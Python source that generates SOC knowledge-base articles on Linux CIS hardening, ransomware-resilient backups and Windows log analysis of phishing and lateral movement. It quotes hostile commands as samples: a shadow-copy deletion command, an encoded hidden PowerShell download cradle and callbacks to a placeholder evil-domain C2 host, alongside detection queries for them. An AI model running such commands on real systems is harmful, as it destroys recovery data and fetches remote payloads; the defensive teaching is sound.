| SSH brute force | Password auth enabled, root login allowed | Disable root SSH, key-only auth |
| Kernel exploits | Outdated kernel, no hardening | Automatic updates, sysctl hardening |
| SUID binary abuse | Many unnecessary SUID binaries | Audit and remove SUID bits |
| Privilege escalation | Weak sudo configuration | Restrict sudo, log all usage |
| Service exploitation | Unnecessary services running | Disable unused services |
| File permission abuse | World-readable sensitive files | Strict permission model |

## Implementation Steps (Ubuntu/RHEL Based)

### Step 1: Filesystem Configuration

```bash
# /etc/fstab - mount /tmp, /var, /home, /dev/shm with security options:
# tmpfs /tmp tmpfs defaults,rw,nosuid,nodev,noexec,relatime 0 0
mount -o remount,nodev,nosuid,noexec /tmp
mount -o remount,nodev,nosuid,noexec /dev/shm

# Disable uncommon filesystems via /etc/modprobe.d/CIS-hardening.conf
for fs in cramfs freevxfs jffs2 hfs hfsplus squashfs udf usb-storage; do
    echo "install $fs /bin/true" >> /etc/modprobe.d/CIS-hardening.conf
done
```

### Step 2: Boot and Kernel Hardening

```bash
# Set GRUB bootloader password
grub2-setpassword  # RHEL/CentOS
# or
grub-mkpasswd-pbkdf2  # Ubuntu (add hash to /etc/grub.d/40_custom)

# Ensure permissions on bootloader config
chmod 600 /boot/grub2/grub.cfg   # RHEL
chmod 600 /boot/grub/grub.cfg    # Ubuntu

# Kernel sysctl hardening - /etc/sysctl.d/99-cis-hardening.conf
cat > /etc/sysctl.d/99-cis-hardening.conf << 'SYSCTL'
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.secure_redirects = 0
net.ipv4.conf.all.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.tcp_syncookies = 1
net.ipv6.conf.all.accept_ra = 0
net.ipv6.conf.all.accept_redirects = 0
kernel.randomize_va_space = 2
kernel.sysrq = 0
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
kernel.yama.ptrace_scope = 1
fs.suid_dumpable = 0
SYSCTL
sysctl --system
```

### Step 3: SSH Hardening

```bash
# /etc/ssh/sshd_config.d/cis-hardening.conf
cat > /etc/ssh/sshd_config.d/cis-hardening.conf << 'SSHD'
Protocol 2
PermitRootLogin no
MaxAuthTries 4
PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
HostbasedAuthentication no
IgnoreRhosts yes
Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512,hmac-sha2-256
KexAlgorithms curve25519-sha256,curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256
LoginGraceTime 60
ClientAliveInterval 300
ClientAliveCountMax 3
LogLevel VERBOSE
AllowGroups sshusers
X11Forwarding no
AllowTcpForwarding no
PermitUserEnvironment no
Banner /etc/issue.net
SSHD
chmod 600 /etc/ssh/sshd_config && systemctl restart sshd
```

### Step 4: User and Authentication Hardening

```bash
# Password policy - /etc/security/pwquality.conf
cat > /etc/security/pwquality.conf << 'PWQUAL'
minlen = 14
dcredit = -1
ucredit = -1
ocredit = -1
lcredit = -1
minclass = 4
maxrepeat = 3
maxclassrepeat = 3
PWQUAL

# Login attempt limits - /etc/pam.d/common-auth (Ubuntu)
# Add before pam_unix.so:
# auth required pam_faillock.so preauth silent deny=5 unlock_time=900
# auth [default=die] pam_faillock.so authfail deny=5 unlock_time=900

# Password aging - /etc/login.defs
sed -i 's/^PASS_MAX_DAYS.*/PASS_MAX_DAYS 365/' /etc/login.defs
sed -i 's/^PASS_MIN_DAYS.*/PASS_MIN_DAYS 1/' /etc/login.defs
sed -i 's/^PASS_WARN_AGE.*/PASS_WARN_AGE 7/' /etc/login.defs

# Secure sudo configuration
# /etc/sudoers.d/cis-hardening
cat > /etc/sudoers.d/cis-hardening << 'SUDOERS'
Defaults use_pty
Defaults logfile="/var/log/sudo.log"
Defaults log_input,log_output
Defaults iolog_dir="/var/log/sudo-io/%{user}"
Defaults timestamp_timeout=5
Defaults passwd_timeout=1
SUDOERS

# Lock inactive accounts after 30 days
useradd -D -f 30

# Audit SUID/SGID binaries
find / -type f \( -perm -4000 -o -perm -2000 \) -exec ls -la {} \; 2>/dev/null
# Review and remove unnecessary SUID bits:
# chmod u-s /usr/bin/unnecessarybinary
```

### Step 5: Service Hardening

```bash
# Disable unnecessary services
systemctl disable --now cups
systemctl disable --now avahi-daemon
systemctl disable --now rpcbind
systemctl disable --now nfs-server
systemctl disable --now vsftpd
systemctl disable --now named
systemctl disable --now httpd    # Unless this is a web server
systemctl disable --now postfix  # Unless this is a mail server

# List all listening services
ss -tlnp

# Configure automatic security updates
# Ubuntu:
apt-get install -y unattended-upgrades
dpkg-reconfigure -plow unattended-upgrades

# RHEL/CentOS:
dnf install -y dnf-automatic
systemctl enable --now dnf-automatic-install.timer
```

### Step 6: Auditd Configuration

```bash
# Install and enable auditd
apt-get install -y auditd audispd-plugins  # Ubuntu
# dnf install -y audit                     # RHEL

# Key CIS audit rules - /etc/audit/rules.d/cis.rules
cat > /etc/audit/rules.d/cis.rules << 'AUDIT'
-D
-b 8192
-f 1
-a always,exit -F arch=b64 -S adjtimex -S settimeofday -k time-change
-w /etc/localtime -p wa -k time-change
-w /etc/group -p wa -k identity
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/hosts -p wa -k network-config
-w /var/log/lastlog -p wa -k logins
-w /var/log/wtmp -p wa -k logins
-w /var/log/btmp -p wa -k logins
-w /etc/sudoers -p wa -k sudoers
-w /etc/sudoers.d/ -p wa -k sudoers
-w /sbin/insmod -p x -k modules
-w /sbin/modprobe -p x -k modules
-a always,exit -F arch=b64 -S init_module -S delete_module -k modules
-a always,exit -F arch=b64 -S unlink -S unlinkat -S rename -S renameat -F auid>=1000 -F auid!=4294967295 -k delete
-a always,exit -F arch=b64 -S setuid -S setgid -S setreuid -S setregid -k privilege-escalation
-e 2
AUDIT

augenrules --load && systemctl restart auditd
```

### Step 7: Firewall Configuration

```bash
# UFW (Ubuntu) or firewalld (RHEL)

# Ubuntu - UFW
ufw default deny incoming
ufw default allow outgoing
ufw allow from 10.200.0.0/24 to any port 22    # SSH from management only
ufw allow 443/tcp                                # HTTPS if web server
ufw enable

# RHEL - firewalld
firewall-cmd --set-default-zone=drop
firewall-cmd --zone=drop --add-rich-rule='rule family="ipv4" source address="10.200.0.0/24" port protocol="tcp" port="22" accept' --permanent
firewall-cmd --reload
```

## Verification Commands

```bash
# Run CIS-CAT assessment tool
# Download from https://www.cisecurity.org/cis-benchmarks/
./cis-cat.sh -b benchmarks/CIS_Ubuntu_Linux_22.04_Benchmark_v1.0.0-xccdf.xml

# Quick manual checks
# SSH config
sshd -T | grep -E "(permitroot|passwordauth|maxauth|protocol)"

# Kernel parameters
sysctl net.ipv4.ip_forward
sysctl kernel.randomize_va_space
sysctl net.ipv4.conf.all.accept_redirects

# Open ports
ss -tlnp

# SUID files
find / -perm -4000 -type f 2>/dev/null | wc -l

# Audit rules loaded
auditctl -l | wc -l

# Failed login attempts
lastb | head -20

# Sudo log
tail -20 /var/log/sudo.log
```

## Monitoring for Bypass

| Attack | Detection |
|---|---|
| SSH brute force | auth.log failed attempts, audit key "logins" |
| Privilege escalation | audit key "privilege-escalation", sudo.log |
| Kernel module loading | audit key "modules" |
| File tampering | audit key "identity", AIDE/Tripwire alerts |
| Rootkit installation | rkhunter, chkrootkit scans |

```bash
# Install and run rootkit detection
apt-get install -y rkhunter chkrootkit
rkhunter --check --sk
chkrootkit

# File integrity monitoring with AIDE
apt-get install -y aide
aideinit
aide --check
```

## MITRE ATT&CK References

| Technique | ID | CIS Control |
|---|---|---|
| Brute Force: SSH | T1110.001 | Key-only auth, fail2ban, AllowGroups |
| Exploitation for Privilege Escalation | T1068 | Kernel hardening, ASLR, patching |
| Abuse Elevation Control: Sudo | T1548.003 | Restricted sudo, logging |
| Boot or Logon Autostart Execution | T1547 | GRUB password, auditd monitoring |
| Create or Modify System Process | T1543 | Service hardening, audit rules |

## Rollout Checklist

- [ ] Partition filesystem with security mount options
- [ ] Apply kernel sysctl hardening
- [ ] Harden SSH configuration (key-only, no root, strong ciphers)
- [ ] Configure password policy and account lockout
- [ ] Disable unnecessary services
- [ ] Configure auditd with CIS rules
- [ ] Deploy host firewall (UFW/firewalld)
- [ ] Enable automatic security updates
- [ ] Install file integrity monitoring (AIDE)
- [ ] Schedule quarterly CIS benchmark assessment
"""
    ))

    # -------------------------------------------------------------------------
    # Article 16: Backup Strategy and Ransomware Resilience
    # -------------------------------------------------------------------------
    articles.append((
        "Backup Strategy and Ransomware Resilience",
        ["backup", "ransomware", "resilience", "defense", "recovery", "business-continuity"],
        r"""# Backup Strategy and Ransomware Resilience

## Why This Matters

Ransomware is the most financially damaging cyber threat facing organizations today. The average ransomware payment exceeded $1.5 million in 2025, and total costs including downtime, recovery, and reputation damage often reach 10x the ransom amount. Modern ransomware groups specifically target backup infrastructure before encrypting production systems, making traditional backup approaches insufficient. A ransomware-resilient backup strategy must assume the attacker will attempt to destroy backups as part of the attack.

**Ransomware attack progression targeting backups:**

```
1. Initial access (phishing, RDP, vulnerability)
2. Lateral movement to find backup infrastructure
3. Escalate privileges to backup admin accounts
4. Delete/encrypt backup repositories and snapshots
5. Disable Volume Shadow Copies on all systems
6. Deploy ransomware across production environment
7. Organization has no backups -> forced to pay ransom
```

**Backup failures during ransomware incidents:**

| Failure | Frequency | Prevention |
|---|---|---|
| Backups encrypted alongside production | Very common | Air-gapped/immutable storage |
| Backup admin credentials compromised | Common | Separate backup credentials, MFA |
| Volume Shadow Copies deleted | Almost always | Offline copies, immutable snapshots |
| Backup software compromised | Growing trend | Hardened backup infrastructure |
| Backup data integrity not verified | Common | Regular restore testing |
| Backup too old (weeks/months) | Common | Frequent backup schedule |

## The 3-2-1-1-0 Backup Rule

```
3 - Keep at least 3 copies of data
2 - Store on 2 different media types
1 - Keep 1 copy offsite (cloud or remote facility)
1 - Keep 1 copy offline or immutable (air-gapped)
0 - Verify 0 errors with regular restore testing
```

## Implementation Steps

### Step 1: Backup Architecture Design

```
Production Environment
    |
    +-- Backup Server (on-premises)
    |       |
    |       +-- Primary Backup Repository
    |       |     (fast storage, 30-day retention)
    |       |
    |       +-- Secondary Repository (NAS/SAN)
    |             (90-day retention)
    |
    +-- Immutable Backup Target
    |       (S3 Object Lock / Linux hardened repo)
    |       (365-day retention, WORM)
    |
    +-- Air-Gapped Backup
    |       (offline tape or removable media)
    |       (monthly full, stored offsite)
    |
    +-- Cloud Backup Replica
            (Azure Blob Immutable / AWS S3 Glacier)
            (365-day retention, cross-region)
```

### Step 2: Configure Immutable Backup Storage

**Linux Hardened Repository (Veeam example):**

```bash
# Create dedicated backup user with minimal permissions
useradd -m -s /bin/bash veeamrepo
mkdir -p /backups/veeam
chown veeamrepo:veeamrepo /backups/veeam

# Make backup directory immutable-capable with XFS reflink
# (filesystem must be XFS with reflink support)
mkfs.xfs -b size=4096 -m reflink=1 /dev/sdb1
mount /dev/sdb1 /backups/veeam

# Veeam uses Linux immutable flag (chattr +i) on backup files
# The backup files cannot be modified or deleted even by root
# until the immutability period expires

# Harden the repository server
# - No domain join (standalone)
# - SSH key-only authentication
# - Separate credentials from production AD
# - No internet access
# - Host-based firewall (allow only backup server)
```

**AWS S3 with Object Lock:**

```bash
# Create S3 bucket with Object Lock (COMPLIANCE = no one can delete)
aws s3api create-bucket --bucket contoso-backups-immutable \
    --object-lock-enabled-for-bucket --region us-east-1

# Set COMPLIANCE retention (30-day minimum hold)
aws s3api put-object-lock-configuration \
    --bucket contoso-backups-immutable \
    --object-lock-configuration '{"ObjectLockEnabled":"Enabled","Rule":{"DefaultRetention":{"Mode":"COMPLIANCE","Days":30}}}'

# Deny policy changes via bucket policy
# Block: s3:PutBucketObjectLockConfiguration, s3:PutObjectRetention, s3:DeleteObjectVersion
# Apply Deny * on the bucket and bucket/* resources
```

### Step 3: Windows Volume Shadow Copy Protection

```powershell
# Ransomware almost always deletes shadow copies: vssadmin delete shadows /all /quiet
# Monitor Event ID 13 (VSS, shadow copy deleted) in System log
# Schedule shadow copies every 4 hours as additional recovery points
# NOTE: Shadow copies are NOT a backup replacement - attackers target these first
wmic shadowcopy call create Volume="C:\"
```

### Step 4: Backup Job Configuration

**Critical system backup schedule:**

| System Type | RPO Target | Backup Frequency | Retention |
|---|---|---|---|
| Domain Controllers | 1 hour | Every 4 hours (system state) | 30 days |
| Database servers | 15 minutes | Transaction logs every 15 min, full daily | 90 days |
| File servers | 4 hours | Every 4 hours incremental, daily full | 90 days |
| Application servers | 24 hours | Daily image backup | 30 days |
| Email (Exchange/M365) | 1 hour | Continuous journal + daily backup | 365 days |
| Endpoint workstations | 24 hours | Daily incremental | 30 days |

**PowerShell: Windows Server Backup for DCs:**

```powershell
# Install Windows Server Backup feature
Install-WindowsFeature -Name Windows-Server-Backup

# Create backup policy for Domain Controller
$policy = New-WBPolicy
$volume = Get-WBVolume -AllVolumes | Where-Object { $_.MountPoint -eq "C:" }
Add-WBVolume -Policy $policy -Volume $volume
Add-WBSystemState -Policy $policy
$target = New-WBBackupTarget -NetworkPath "\\backup-server\dc-backups$" `
    -Credential (Get-Credential)
Add-WBBackupTarget -Policy $policy -Target $target
Set-WBSchedule -Policy $policy -Schedule 02:00,06:00,10:00,14:00,18:00,22:00
Set-WBPolicy -Policy $policy
```

### Step 5: Backup Access Controls

```powershell
# Separate backup admin accounts from regular admin accounts
# These accounts should:
# - NOT be Domain Admins
# - NOT be used for any other purpose
# - Use MFA for all access
# - Be in Protected Users group
# - Have passwords stored in a PAM vault

# Network isolation for backup infrastructure
# Backup VLAN: Only backup server can reach agents
# Firewall rules:
# Allow: Backup Server -> Production Servers (backup agent port)
# Allow: Backup Server -> Immutable Repo (backup protocol)
# Deny:  Production Servers -> Backup Server (management ports)
# Deny:  User VLANs -> Backup Infrastructure (all)
```

### Step 6: Restore Testing Procedures

**Monthly restore test process:**

1. Restore latest backup to isolated test VM
2. Verify restored system boots and services start
3. Validate data integrity (dcdiag for DCs, app-specific checks)
4. Document results and send report to backup team
5. Destroy test VM after validation

Automate this with a script that logs each step and emails the SOC/backup team on completion. Track restore success rate as a KPI -- target 100% monthly pass rate.

### Step 7: Ransomware Detection in Backups

```powershell
# Monitor for mass file extension changes (ransomware indicator)
# Run before backup to detect active encryption

$watchPaths = @("C:\Shares\Finance", "C:\Shares\HR", "C:\Shares\Engineering")

foreach ($path in $watchPaths) {
    $suspiciousExtensions = Get-ChildItem -Path $path -Recurse -File |
        Where-Object {
            $_.Extension -match '\.(encrypted|locked|crypt|enc|ransom)' -or
            $_.Extension -match '\.[a-z0-9]{5,8}$'  # Random extension
        }

    if ($suspiciousExtensions.Count -gt 10) {
        $alert = @{
            Timestamp = Get-Date
            Path = $path
            SuspiciousFiles = $suspiciousExtensions.Count
            Examples = ($suspiciousExtensions | Select-Object -First 5 |
                ForEach-Object { $_.FullName })
        }
        # Send to SIEM
        Write-EventLog -LogName Application -Source "BackupGuard" `
            -EventId 9001 -EntryType Warning `
            -Message "Potential ransomware detected: $($alert | ConvertTo-Json)"
    }
}
```

## Verification Commands

```powershell
# Check Windows Server Backup status
Get-WBSummary | Select-Object LastSuccessfulBackupTime,
    LastBackupResultHR, NumberOfVersions

# Verify shadow copies exist
vssadmin list shadows

# Check backup repository space
Get-WBBackupTarget | Select-Object TargetPath, FreeSpace

# Verify immutable storage (AWS)
aws s3api get-object-lock-configuration --bucket contoso-backups-immutable

# List recent backup jobs (Veeam example)
# Get-VBRBackupSession | Where-Object { $_.EndTime -gt (Get-Date).AddDays(-7) } |
#     Select-Object Name, Result, EndTime
```

```bash
# Linux: Verify backup integrity
sha256sum /backups/latest/*.bak > /backups/checksums.txt
# Compare on next check:
sha256sum -c /backups/checksums.txt

# Verify immutable flag on Linux repo
lsattr /backups/veeam/
# Should show 'i' flag: ----i----------- filename
```

## Monitoring for Bypass

| Attack on Backups | Detection |
|---|---|
| Backup admin account compromise | MFA alerts, unusual login times/locations |
| Backup deletion attempts | Backup software alerts, immutable storage prevents |
| VSS deletion (vssadmin/wmic) | Process monitoring for vssadmin.exe, wmic shadowcopy |
| Backup agent uninstall | Endpoint detection, service monitoring |
| Network path to backup changed | Configuration monitoring, file integrity |

```kql
// Detect shadow copy deletion
DeviceProcessEvents
| where FileName in ("vssadmin.exe", "wmic.exe", "wbadmin.exe")
| where ProcessCommandLine has_any ("delete", "shadowcopy", "catalog")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine

// Detect backup service tampering
DeviceProcessEvents
| where FileName == "sc.exe" or FileName == "net.exe"
| where ProcessCommandLine has_any ("veeam", "backup", "shadow", "vss")
| where ProcessCommandLine has_any ("stop", "disable", "delete")
```

## MITRE ATT&CK References

| Technique | ID | Mitigation |
|---|---|---|
| Data Encrypted for Impact | T1486 | Immutable backups enable recovery |
| Inhibit System Recovery | T1490 | Air-gapped + immutable backups survive |
| Data Destruction | T1485 | Multiple backup copies with verification |
| Account Manipulation | T1098 | Separate backup credentials |
| Service Stop | T1489 | Monitor backup service status |

## Rollout Checklist

- [ ] Inventory all critical systems and data for backup priority
- [ ] Define RPO and RTO targets per system tier
- [ ] Implement 3-2-1-1-0 backup strategy
- [ ] Deploy immutable backup storage (S3 Object Lock or Linux hardened repo)
- [ ] Configure air-gapped backup rotation (tape or offline media)
- [ ] Create separate backup admin accounts with MFA
- [ ] Isolate backup infrastructure on dedicated network segment
- [ ] Implement ransomware detection before backup jobs
- [ ] Schedule monthly automated restore tests
- [ ] Document and test full disaster recovery runbook annually
"""
    ))

    return articles


def log_analysis_articles():
    """Return 16 log analysis deep-dive articles for SOC analyst knowledge base."""

    articles = []

    # ----------------------------------------------------------------
    # Article 1
    # ----------------------------------------------------------------
    articles.append((
        "Tracing a Phishing Compromise Through Windows Event Logs",
        ["log-analysis", "phishing", "event-logs", "forensics", "windows"],
        r"""# Tracing a Phishing Compromise Through Windows Event Logs

## Scenario Setup

A user in the finance department reported a suspicious email after clicking a link
and opening an attachment. The SOC received an alert from the email gateway about
a potential credential-harvesting URL. Your task is to reconstruct the full
compromise chain using only Windows Event Logs from the affected workstation and
the domain controller.

**Environment:**
- Windows 10 22H2 workstation (FINWS042)
- Active Directory domain: corp.acme.local
- Sysmon v15 installed, standard config
- Event forwarding to central SIEM

## Key Event IDs to Collect

| Event ID | Source | Meaning |
|----------|--------|---------|
| 4624 | Security | Successful logon |
| 4648 | Security | Logon with explicit credentials |
| 4688 | Security | Process creation (if auditing enabled) |
| 1 | Sysmon | Process create |
| 3 | Sysmon | Network connection |
| 11 | Sysmon | File create |
| 13 | Sysmon | Registry value set |
| 15 | Sysmon | File create stream hash (ADS) |

## Sample Log Entries

### Outlook spawning browser (Sysmon Event ID 1)

```xml
<Event>
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-02-10T09:14:32.441Z" />
    <Computer>FINWS042.corp.acme.local</Computer>
  </System>
  <EventData>
    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE</Data>
    <Data Name="ParentCommandLine">"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"</Data>
    <Data Name="Image">C:\Program Files\Google\Chrome\Application\chrome.exe</Data>
    <Data Name="CommandLine">"chrome.exe" "https://login-acme.evil-domain[.]com/auth"</Data>
    <Data Name="User">CORP\j.martinez</Data>
    <Data Name="Hashes">SHA256=A1B2C3...</Data>
  </EventData>
</Event>
```

**Annotation:** Outlook directly spawning a browser to an external URL is the
phishing click. Note the deceptive domain `login-acme.evil-domain[.]com`.

### Macro-enabled document spawning PowerShell (Sysmon Event ID 1)

```xml
<Event>
  <EventData>
    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -enc SQBFAFgAIAAoA...</Data>
    <Data Name="User">CORP\j.martinez</Data>
  </EventData>
</Event>
```

**Annotation:** Classic Office-to-PowerShell execution chain. The `-enc` flag
hides a Base64-encoded download cradle. Decode with:
`[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String("SQBFAFgAIAAoA..."))`

### Network callback (Sysmon Event ID 3)

```xml
<Event>
  <EventData>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="DestinationIp">198.51.100.44</Data>
    <Data Name="DestinationPort">443</Data>
    <Data Name="DestinationHostname">cdn-update.evil-domain[.]com</Data>
  </EventData>
</Event>
```

## Query Examples

### KQL - Find Office apps spawning script interpreters

```kql
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("outlook.exe","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("powershell.exe","cmd.exe","wscript.exe","cscript.exe","mshta.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName,
          FileName, ProcessCommandLine, AccountName
| sort by Timestamp asc
```

### SPL - Credential harvesting followed by payload execution

```spl
index=wineventlog source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
  EventCode=1
  (ParentImage="*\\OUTLOOK.EXE" OR ParentImage="*\\WINWORD.EXE")
  (Image="*\\powershell.exe" OR Image="*\\cmd.exe" OR Image="*\\mshta.exe")
| table _time, Computer, ParentImage, Image, CommandLine, User
| sort _time
```

### EQL - Full phishing chain in sequence

```eql
sequence by host.name with maxspan=10m
  [process where process.parent.name == "outlook.exe"
    and process.name in ("chrome.exe", "msedge.exe", "firefox.exe")]
  [process where process.parent.name in ("winword.exe", "excel.exe")
    and process.name in ("powershell.exe", "cmd.exe")]
  [network where process.name == "powershell.exe"
    and not cidrmatch(destination.ip, "10.0.0.0/8", "172.16.0.0/12")]
```

## Correlation Logic

Build the attack chain by joining events on the user and host within a time window:

1. **T=0 min** - Email gateway logs show delivery of message with URL
2. **T+2 min** - Outlook spawns browser to credential-harvesting page (Sysmon 1)
3. **T+3 min** - User opens attachment; WINWORD.EXE launches (Sysmon 1)
4. **T+4 min** - WINWORD spawns PowerShell with encoded command (Sysmon 1)
5. **T+4 min** - PowerShell makes outbound HTTPS to C2 (Sysmon 3)
6. **T+5 min** - Dropped payload written to disk (Sysmon 11)
7. **T+6 min** - Persistence via Registry Run key (Sysmon 13)

## Timeline Reconstruction

| Time (UTC) | Event | Source | Detail |
|------------|-------|--------|--------|
| 09:12:01 | Email delivered | Email Gateway | Subject: "Invoice Q4 Review" |
| 09:14:32 | Phishing click | Sysmon 1 | Outlook -> Chrome to evil domain |
| 09:15:10 | Attachment opened | Sysmon 1 | WINWORD launched Invoice_Q4.docm |
| 09:15:48 | Macro fires | Sysmon 1 | WINWORD -> powershell.exe -enc ... |
| 09:15:52 | C2 callback | Sysmon 3 | PS -> 198.51.100.44:443 |
| 09:16:05 | Payload drop | Sysmon 11 | C:\Users\j.martinez\AppData\Local\Temp\svchost.exe |
| 09:16:22 | Persistence | Sysmon 13 | HKCU\Software\Microsoft\Windows\CurrentVersion\Run |
| 09:18:41 | Credential dump | Security 4648 | Explicit credential logon attempt |

## Conclusions

- The full dwell time from click to persistence was under **4 minutes**
- The attack used a two-stage approach: credential harvesting URL + weaponized attachment
- Sysmon provided the critical parent-child process chain; without it the
  Security log alone would have shown only logon events
- The encoded PowerShell command is the strongest IOC for detection engineering

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Phishing: Spearphishing Attachment | T1566.001 | Initial Access |
| User Execution: Malicious File | T1204.002 | Execution |
| Command and Scripting Interpreter: PowerShell | T1059.001 | Execution |
| Boot or Logon Autostart Execution: Registry Run Keys | T1547.001 | Persistence |
| Application Layer Protocol: Web Protocols | T1071.001 | Command and Control |
"""
    ))

    # ----------------------------------------------------------------
    # Article 2
    # ----------------------------------------------------------------
    articles.append((
        "Reconstructing Lateral Movement from Authentication Logs",
        ["log-analysis", "lateral-movement", "authentication", "active-directory", "forensics"],
        r"""# Reconstructing Lateral Movement from Authentication Logs

## Scenario Setup

The IR team confirmed a compromised workstation in the engineering department. The
attacker gained local admin credentials and is suspected of pivoting across the
network. Your objective is to map the lateral movement path using authentication
logs from domain controllers, workstations, and network devices.

**Environment:**
- Windows Server 2022 DCs (DC01, DC02)
- Mixed Windows 10/11 fleet
- Network segmentation: Engineering (10.1.0.0/24), Finance (10.2.0.0/24), Servers (10.3.0.0/24)
- Advanced Audit Policy enabled

## Key Event IDs

| Event ID | Source | Meaning |
|----------|--------|---------|
| 4624 | Security | Successful logon |
| 4625 | Security | Failed logon |
| 4648 | Security | Logon using explicit credentials |
| 4672 | Security | Special privileges assigned |
| 4776 | Security | NTLM credential validation |
| 4768 | Security | Kerberos TGT request |
| 4769 | Security | Kerberos service ticket request |

## Logon Type Reference

| Logon Type | Name | Lateral Movement Indicator |
|------------|------|---------------------------|
| 2 | Interactive | Low - local console |
| 3 | Network | HIGH - SMB, WMI, PsExec |
| 7 | Unlock | Low - screen unlock |
| 9 | NewCredentials | HIGH - runas /netonly |
| 10 | RemoteInteractive | HIGH - RDP |

## Sample Log Entries

### PsExec-style lateral movement (Event 4624 Type 3)

```
Log Name:      Security
Source:         Microsoft-Windows-Security-Auditing
Event ID:      4624
Time:          2026-02-10T10:22:14.003Z
Computer:      ENGWS015.corp.acme.local
Logon Type:    3
Account Name:  svc_deploy        <-- Service account misuse
Account Domain: CORP
Source Network Address: 10.1.0.42  <-- Compromised host
Logon Process: NtLmSsp
Authentication Package: NTLM      <-- NTLM instead of Kerberos = suspicious
```

**Annotation:** Type 3 logon with NTLM from an engineering workstation using a
service account. Attackers often use pass-the-hash which forces NTLM.

### RDP lateral movement (Event 4624 Type 10)

```
Event ID:      4624
Computer:      FINSRV01.corp.acme.local
Logon Type:    10
Account Name:  admin_jsmith
Source Network Address: 10.1.0.15
```

**Annotation:** Type 10 logon from the engineering subnet to a finance server
indicates cross-segment RDP. This should trigger an alert if admin_jsmith does
not normally access finance systems.

### Failed logon spray (Event 4625)

```
Event ID:      4625
Computer:      DC01.corp.acme.local
Failure Reason: Unknown user name or bad password
Account Name:  administrator
Source Network Address: 10.1.0.42
Count in 5 min: 47
```

## Query Examples

### KQL - Map lateral movement paths

```kql
SecurityEvent
| where EventID == 4624
| where LogonType in (3, 10)
| where AccountName !endswith "$"
| where IpAddress != "-" and IpAddress != "127.0.0.1"
| summarize TargetHosts=make_set(Computer),
            LogonCount=count(),
            FirstSeen=min(TimeGenerated),
            LastSeen=max(TimeGenerated)
    by AccountName, IpAddress, LogonType
| where LogonCount > 3
| sort by LogonCount desc
```

### SPL - Detect NTLM relay / pass-the-hash

```spl
index=wineventlog EventCode=4624 Logon_Type=3 Authentication_Package=NTLM
| where Account_Name!="ANONYMOUS LOGON" AND Account_Name!="*$"
| stats count, dc(ComputerName) as unique_targets,
        values(ComputerName) as targets,
        earliest(_time) as first, latest(_time) as last
    by Account_Name, Source_Network_Address
| where unique_targets > 2
| sort - unique_targets
```

### EQL - Sequential lateral movement hops

```eql
sequence by user.name with maxspan=30m
  [authentication where event.outcome == "success"
    and winlog.logon.type == "Network"
    and source.ip == "10.1.0.42"]
  [authentication where event.outcome == "success"
    and winlog.logon.type == "Network"
    and source.ip != "10.1.0.42"]
  [authentication where event.outcome == "success"
    and winlog.logon.type == "Network"
    and source.ip != "10.1.0.42"]
```

## Correlation Logic

Build a directed graph of lateral movement:

1. Extract all Type 3 and Type 10 logons with source IP and target host
2. Filter out machine accounts (ending in `$`) and known service patterns
3. Create edges: `source_ip -> target_host` with timestamp and account
4. Identify the "fan-out" pattern: one source touching many targets quickly
5. Cross-reference with process creation logs on target hosts

**Fan-out detection rule:**

```
IF (single source IP) AND (>3 unique target hosts) AND (within 15 minutes)
   AND (LogonType IN [3,10]) AND (AuthPackage == "NTLM")
THEN raise HIGH severity lateral movement alert
```

## Timeline Reconstruction

| Time (UTC) | Source | Target | Account | Type | Method |
|------------|--------|--------|---------|------|--------|
| 10:15:00 | External | ENGWS042 | j.martinez | - | Initial compromise |
| 10:22:14 | 10.1.0.42 | ENGWS015 | svc_deploy | 3/NTLM | PsExec (pass-the-hash) |
| 10:28:33 | 10.1.0.15 | ENGWS022 | svc_deploy | 3/NTLM | WMI remote exec |
| 10:35:07 | 10.1.0.22 | FINSRV01 | admin_jsmith | 10 | RDP with stolen creds |
| 10:41:19 | 10.3.0.10 | DC01 | admin_jsmith | 3/NTLM | DCSync attempt |
| 10:42:01 | DC01 | - | - | 4769 | SPN request for krbtgt |

## Conclusions

- The attacker moved through **4 hosts** in under 30 minutes
- NTLM authentication was the consistent indicator; Kerberos was available but
  not used, suggesting pass-the-hash rather than stolen plaintext passwords
- The jump from engineering to finance subnet violated network segmentation policy
- The final DCSync attempt against the domain controller was the highest-risk action

## MITRE ATT&CK References

| Technique | ID | Phase |
|-----------|----|-------|
| Remote Services: SMB/Windows Admin Shares | T1021.002 | Lateral Movement |
| Remote Services: Remote Desktop Protocol | T1021.001 | Lateral Movement |
| Use Alternate Authentication Material: Pass the Hash | T1550.002 | Lateral Movement |
| Valid Accounts: Domain Accounts | T1078.002 | Privilege Escalation |
| OS Credential Dumping: DCSync | T1003.006 | Credential Access |
"""
    ))

    # ----------------------------------------------------------------
    # Article 3
    # ----------------------------------------------------------------
    articles.append((
        "Identifying C2 Communication from Proxy Log Patterns",
        ["log-analysis", "c2", "proxy-logs", "network-analysis", "threat-hunting"],
        r"""# Identifying C2 Communication from Proxy Log Patterns

## Scenario Setup

